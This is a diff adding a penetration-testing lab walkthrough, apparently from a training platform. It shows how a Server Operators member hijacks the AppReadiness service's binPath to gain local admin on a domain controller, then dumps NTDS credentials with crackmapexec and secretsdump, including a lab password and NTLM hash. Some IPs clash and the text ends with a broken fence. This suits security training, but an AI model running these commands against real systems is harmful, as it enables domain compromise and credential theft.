@@ -1071,3 +1071,78 @@ The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identi
 
 Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.
 
+Let's examine the AppReadiness service.
+
+>_App Readiness_ gets apps ready for use the first time a user signs in to this PC and when adding new apps.
+
+We can confirm that this service starts as SYSTEM using the sc.exe utility.
+
+```powershell
+sc.exe qc AppReadiness
+```
+
+
+**Checking Service Permissions with PsService:** We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check permissions on the service. `PsService` works much like the `sc` utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.
+
+```powershell
+c:\Tools\PsService.exe security AppReadiness
+```
+
+If we see in the output:
+
+```
+ [ALLOW] BUILTIN\Server Operators
+ ```
+
+This confirms that the Server Operators group has [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) access right, which gives us full control over this service.
+
+Checking Local Admin Group Membership to confirm that our target account is not present:
+
+```powershell
+net localgroup Administrators
+```
+
+**Modifying the Service Binary Path**: Let's change the binary path to execute a command which adds our current user to the default local administrators group.
+
+```powershell
+sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+```
+
+**Starting the service fails**, which is expected.
+
+```powershell
+sc.exe start AppReadiness
+```
+
+**Confirming Local Admin Group Membership**:If we check the membership of the administrators group, we see that the command was executed successfully.
+
+```powershell
+net localgroup Administrators
+```
+
+**Confirming Local Admin Access on Domain Controller**: From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.
+
+```
+crackmapexec smb 10.129.43.42 -u server_adm -p 'HTB_@cademy_stdnt!'
+```
+
+Output:
+
+```
+SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
+```
+
+
+Retrieving NTLM Password Hashes from the Domain Controller:
+
+```bash
+secretsdump.py server_adm@10.129.43.42 -just-dc-user administrator
+```
+
+Returning all ntdi:
+
+```
+crackmapexec smb  10.129.172.26 -u Administrator -H 7796ee39fd3a9c3a1844556115ae1a54 -d INLANEFREIGHT.LOCAL --ntds   
+``
+
